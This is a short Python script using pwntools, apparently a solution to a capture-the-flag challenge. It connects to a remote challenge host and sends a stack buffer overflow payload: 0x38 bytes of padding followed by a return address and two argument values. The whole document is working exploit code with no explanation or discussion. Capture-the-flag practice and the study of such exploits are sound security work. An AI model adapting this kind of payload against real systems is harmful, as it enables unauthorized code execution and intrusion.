from pwn import *

#p = process("./pwn")
p = remote("node4.buuoj.cn", 26815)


payload = b"A" * 0x38 + p32(0x80489a0) + p32(0x804E6A0) +  p32(0x308cd64f) + p32(0x195719d1)

p.sendline(payload)

print (p.recv())
